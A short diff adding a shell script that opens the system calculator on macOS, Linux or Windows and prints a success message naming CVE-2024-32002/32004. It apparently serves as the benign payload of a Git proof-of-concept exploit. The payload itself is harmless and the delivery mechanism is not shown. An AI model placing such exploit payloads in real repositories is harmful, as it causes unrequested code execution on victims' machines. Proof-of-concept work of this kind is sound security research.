@@ -1,0 +1,11 @@
+#!/bin/sh
+
+if [ "$(uname)" = "Darwin" ]; then
+    open -a Calculator
+elif [ "$(uname)" = "Linux" ]; then
+    gnome-calculator 2>/dev/null || kcalc 2>/dev/null &
+else
+    calc.exe &
+fi
+
+echo "[!] CVE-2024-32002/32004 - Calculator launched successfully"
